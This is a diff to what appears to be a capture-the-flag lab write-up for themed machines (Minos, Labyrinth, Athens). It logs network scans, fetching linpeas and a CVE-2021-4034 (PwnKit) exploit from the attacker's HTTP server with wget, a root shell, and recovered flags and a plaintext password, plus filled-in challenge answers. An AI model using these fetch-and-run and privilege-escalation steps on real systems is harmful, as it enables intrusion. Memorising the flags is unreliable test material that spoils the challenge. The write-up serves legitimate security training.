@@ -1875,7 +1875,315 @@ curl Minos.lxd:8080
 
 		<img src="/static/Knossos.jpg" />
 	</body>
+continuing
 
+# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.71.235.7  netmask 255.255.255.0  broadcast 10.71.235.255
+        inet6 fe80::216:3eff:fe8a:139  prefixlen 64  scopeid 0x20<link>
+        inet6 fd42:a113:181b:47f:216:3eff:fe8a:139  prefixlen 64  scopeid 0x0<global>
+        ether 00:16:3e:8a:01:39  txqueuelen 1000  (Ethernet)
+        RX packets 240  bytes 26136 (26.1 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 232  bytes 22258 (22.2 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 3133  bytes 791785 (791.7 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 3133  bytes 791785 (791.7 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+# nmap -sn 10.71.235.255/24
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 17:10 UTC
+Nmap scan report for ip-10-71-235-1.eu-west-1.compute.internal (10.71.235.1)
+Host is up (0.000033s latency).
+MAC Address: FE:46:D7:FA:E5:31 (Unknown)
+Nmap scan report for Athens.lxd (10.71.235.37)
+Host is up (-0.088s latency).
+MAC Address: 00:16:3E:9E:36:DA (Xensource)
+Nmap scan report for Labyrinth.lxd (10.71.235.159)
+Host is up (-0.10s latency).
+MAC Address: 00:16:3E:65:94:47 (Xensource)
+Nmap scan report for Minos.lxd (10.71.235.7)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 4.81 seconds
+
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.0.7 - - [20/May/2024 13:22:02] "GET /linpeas.sh HTTP/1.1" 200 -
+
+entrance@Labyrinth:/home$ ls
+ariadne  entrance  minotaur
+entrance@Labyrinth:/home$ cd /tmp
+entrance@Labyrinth:/tmp$ ls
+systemd-private-0d01bcbdcd194c3e8200c71ab19c50b2-systemd-resolved.service-bTDT4Y
+entrance@Labyrinth:/tmp$ wget http://10.8.19.103:8000/linpeas.sh
+--2024-05-20 17:22:01--  http://10.8.19.103:8000/linpeas.sh
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828098 (809K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 808.69K   461KB/s    in 1.8s    
+
+2024-05-20 17:22:04 (461 KB/s) - ‘linpeas.sh’ saved [828098/828098]
+
+entrance@Labyrinth:/tmp$ chmod +x linpeas.sh
+entrance@Labyrinth:/tmp$ ./linpeas.sh
+
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-4034
+
+Potentially Vulnerable to CVE-2022-2588
+
+-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
+
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ ls
+CVE-2021-4034.py  LICENSE  README.md
+                                                                                   
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ tail CVE-2021-4034.py 
+    print('[!] Failed to create gconf-modules config file.')
+    sys.exit()
+
+# Convert the environment to an array of char*
+environ_p = (c_char_p * len(environ))()
+environ_p[:] = environ
+
+print('[+] Calling execve()')
+# Call execve() with NULL arguments
+libc.execve(b'/home/red/.git/pkexec', c_char_p(None), environ_p)
+
+change to (if u did Red Room)
+
+https://github.com/joeammond/CVE-2021-4034
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ tail CVE-2021-4034.py 
+    print('[!] Failed to create gconf-modules config file.')
+    sys.exit()
+
+# Convert the environment to an array of char*
+environ_p = (c_char_p * len(environ))()
+environ_p[:] = environ
+
+print('[+] Calling execve()')
+# Call execve() with NULL arguments
+libc.execve(b'/usr/bin/pkexec', c_char_p(None), environ_p)
+
+┌──(witty㉿kali)-[~/Downloads/CVE-2021-4034]
+└─$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.0.7 - - [20/May/2024 13:37:30] "GET /CVE-2021-4034.py HTTP/1.1" 200 -
+
+entrance@Labyrinth:/tmp$ wget http://10.8.19.103:8000/CVE-2021-4034.py
+--2024-05-20 17:37:29--  http://10.8.19.103:8000/CVE-2021-4034.py
+Connecting to 10.8.19.103:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3262 (3.2K) [text/x-python]
+Saving to: ‘CVE-2021-4034.py’
+
+CVE-2021-4034.py    100%[===================>]   3.19K  --.-KB/s    in 0s      
+
+2024-05-20 17:37:30 (250 MB/s) - ‘CVE-2021-4034.py’ saved [3262/3262]
+
+entrance@Labyrinth:/tmp$ python3 CVE-2021-4034.py
+[+] Creating shared library for exploit code.
+[-] GCONV_PATH=. directory already exists, continuing.
+[-] exploit directory already exists, continuing.
+[+] Calling execve()
+# id
+uid=0(root) gid=1001(entrance) groups=1001(entrance)
+
+thx LSD00
+
+root@Labyrinth:/tmp# grep -iRl "thm{" /home/* 2>/dev/null
+grep -iRl "thm{" /home/* 2>/dev/null
+/home/ariadne/Minotaur_Flag
+/home/minotaur/Labyrinth_Flag
+
+
+# cd /home
+# ls
+ariadne  entrance  minotaur
+# cd minotaur
+# ls
+Labyrinth_Flag	Minotaur  ariadne  thread
+# cat Labyrinth_Flag
+THM{6154ea526254375613650183962bf431}
+# ls
+Labyrinth_Flag	Minotaur  ariadne  thread
+# cd ..
+# ls
+ariadne  entrance  minotaur
+# cd ariadne
+# ls
+Minotaur_Flag  TheReturn  ariadne
+# cat Minotaur_Flag
+THM{c307b8045208fac06b9faa90e68d2ad4}
+
+# ls -lah
+total 42K
+drwxr-xr-x 4 ariadne ariadne   11 Aug 20  2020 .
+drwxr-xr-x 5 root    root       5 Aug  3  2020 ..
+lrwxrwxrwx 1 root    root       9 Aug  3  2020 .bash_history -> /dev/null
+-rw-r--r-- 1 ariadne ariadne  220 Aug  3  2020 .bash_logout
+-rw-r--r-- 1 ariadne ariadne 3.7K Aug  3  2020 .bashrc
+drwx------ 3 ariadne ariadne    3 Aug  3  2020 .gnupg
+-rw-r--r-- 1 ariadne ariadne  807 Aug  3  2020 .profile
+drwx------ 2 ariadne ariadne    5 Aug  4  2020 .ssh
+-rwxr----- 1 ariadne ariadne   38 Aug  3  2020 Minotaur_Flag
+-rwxr----- 1 ariadne ariadne  689 Aug 20  2020 TheReturn
+-rw-r--r-- 1 ariadne ariadne  30K Aug 20  2020 ariadne
+# bash -i
+root@Labyrinth:/home/ariadne# cat TheReturn
+Despair set in and Theseus wondered
+if this was where his life would end, 
+down in the dark, all alone, next to
+the stinking body. Then his hand brushed
+a piece of string and, with a whoop
+of delight, he knew he had found the
+thread which would lead him back out of
+the labyrinth. As he neared the entrance,
+the darkness began to fade he made
+out the figure of Ariadne, waiting for
+his return.
+
+"You must take me back to Athens with you!"
+she cried, "My father will kill me when 
+he finds out that I have helped you."
+
+Theseus insisted she come with them, "it 
+would be crule to leave you here." Quickly
+and quietly, they unfurled the great black 
+sails of their ship and headed for home.
+
+root@Labyrinth:/home/ariadne# file ariadne
+ariadne: data
+
+root@Labyrinth:/home/minotaur# cat Minotaur
+Theseus walked carefully through the dark, 
+foul-smelling passages of the labyrinth, 
+expecting any moment to come face-to-face 
+with the creature. He did not have long to
+wait. Turning a corner, with his hands held
+out in front of him feeling his way, suddenly
+he touched what felt like a huge bony horn.
+
+In an instant his world turned upside down,
+quite literally. He was picked up between the
+Minotaurs horns and tossed high into the air.
+When he landed on the hard cold stone, he felt
+the animal's huge hooves come down on his 
+chest. Every last breath seemed to be knocked
+out of him and he struggled to stay alive in 
+the darkness.
+
+But Theseus the son of King Aegeus was both 
+brave and stubborn. As the Minotaur bellowed
+in his ear and grabbed at him, Theseus found a
+strength which he did not know he possessed.
+
+He grabbed the animal's huge horns, and kept
+on twisting the great head from side to side.
+As the animal grew weak, Theseus gave one almighty
+wrench on the head, turning it almost the whole way,
+The creature's neck snapped, it gurgled its 
+last breath and fell to the floor with an
+enormous thud.
+
+It was over, he had done it. The Minotaur was
+dead. All he has to do was make his way back 
+out of the Labyrinth... And at that moment he
+realized the awful mistake he had made. In the
+struggle with the Minotaur he had dropped the 
+string, his lifeline. Theseus felt all over
+the floor in the pitch darkness for the string.
+
+root@Labyrinth:/home/minotaur# file thread
+thread: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66742fe34842823ac968336a34a14a63d5e6df5f, not stripped
+root@Labyrinth:/home/minotaur# cat ariadne
+Username: ariadne
+Password: TheLover
+
+root@Labyrinth:/root# ls -lah
+total 14K
+drwx------  5 root root   10 Aug 20  2020 .
+drwxr-xr-x 22 root root   22 Jul 29  2020 ..
+lrwxrwxrwx  1 root root    9 Aug  3  2020 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3.1K Apr  9  2018 .bashrc
+drwx------  2 root root    3 Aug  3  2020 .cache
+drwx------  3 root root    3 Aug  3  2020 .gnupg
+-rw-r--r--  1 root root  148 Aug 17  2015 .profile
+drwx------  2 root root    4 Aug  4  2020 .ssh
+-rw-------  1 root root  12K Aug 20  2020 .viminfo
+-rw-r--r--  1 root root 1.6K Aug  3  2020 maze
+root@Labyrinth:/root# file maze
+maze: ASCII text
+root@Labyrinth:/root# cat -v maze
+88888888888888888888888888888888888888888888888888888888888888888888888
+88.._|      | `-.  | `.  -_-_ _-_  _-  _- -_ -  .'|   |.'|     |  _..88
+88   `-.._  |    |`!  |`.  -_ -__ -_ _- _-_-  .'  |.;'   |   _.!-'|  88
+88      | `-!._  |  `;!  ;. _______________ ,'| .-' |   _!.i'     |  88
+88..__  |     |`-!._ | `.| |_______________||."'|  _!.;'   |     _|..88
+88   |``"..__ |    |`";.| i|_|MMMMMMMMMMM|_|'| _!-|   |   _|..-|'    88
+88   |      |``--..|_ | `;!|l|MMoMMMMoMMM|1|.'j   |_..!-'|     |     88
+88   |      |    |   |`-,!_|_|MMMMP'YMMMM|_||.!-;'  |    |     |     88
+88___|______|____!.,.!,.!,!|d|MMMo * loMM|p|,!,.!.,.!..__|_____|_____88
+88      |     |    |  |  | |_|MMMMb,dMMMM|_|| |   |   |    |      |  88
+88      |     |    |..!-;'i|r|MPYMoMMMMoM|r| |`-..|   |    |      |  88
+88      |    _!.-j'  | _!,"|_|M<>MMMMoMMM|_||!._|  `i-!.._ |      |  88
+88     _!.-'|    | _."|  !;|1|MbdMMoMMMMM|l|`.| `-._|    |``-.._  |  88
+88..-i'     |  _.''|  !-| !|_|MMMoMMMMoMM|_|.|`-. | ``._ |     |``"..88
+88   |      |.|    |.|  !| |u|MoMMMMoMMMM|n||`. |`!   | `".    |     88
+88   |  _.-'  |  .'  |.' |/|_|MMMMoMMMMoM|_|! |`!  `,.|    |-._|     88
+88  _!"'|     !.'|  .'| .'|[@]MMMMMMMMMMM[@] \|  `. | `._  |   `-._  88
+88-'    |   .'   |.|  |/| /                 \|`.  |`!    |.|      |`-88
+88      |_.'|   .' | .' |/                   \  \ |  `.  | `._-   |  88
+88     .'   | .'   |/|  /                     \ |`!   |`.|    `.  |  88
+88  _.'     !'|   .' | /                       \|  `  |  `.    |`.|  88
+88888888888888888888888888888888888888888888888888888888888888888888888
+
+minos@Minos:/$ nmap -sn 10.71.235.255/24
+nmap -sn 10.71.235.255/24
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 18:08 UTC
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+Nmap scan report for ip-10-71-235-1.eu-west-1.compute.internal (10.71.235.1)
+Host is up (-0.20s latency).
+MAC Address: FE:46:D7:FA:E5:31 (Unknown)
+Nmap scan report for Athens.lxd (10.71.235.37)
+Host is up (0.000017s latency).
+MAC Address: 00:16:3E:9E:36:DA (Xensource)
+Nmap scan report for Labyrinth.lxd (10.71.235.159)
+Host is up (0.000014s latency).
+MAC Address: 00:16:3E:65:94:47 (Xensource)
+Nmap scan report for Minos.lxd (10.71.235.7)
+Host is up.
+Nmap done: 256 IP addresses (4 hosts up) scanned in 5.64 seconds
+
+minos@Minos:/$ nmap 10.71.235.37
+nmap 10.71.235.37
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2024-05-20 18:11 UTC
+WARNING: Running Nmap setuid, as you are doing, is a major security risk.
+
+Nmap scan report for Athens.lxd (10.71.235.37)
+Host is up (0.0000070s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+MAC Address: 00:16:3E:9E:36:DA (Xensource)
 
 ```
 
@@ -1887,11 +2195,11 @@ What is the Minos flag?
 
 What is the Labyrinth flag?  
 
-**
+*THM{6154ea526254375613650183962bf431}*
 
 What is the Minotaur flag?  
 
-**
+*THM{c307b8045208fac06b9faa90e68d2ad4}*
 
 What is the Athens flag?
 
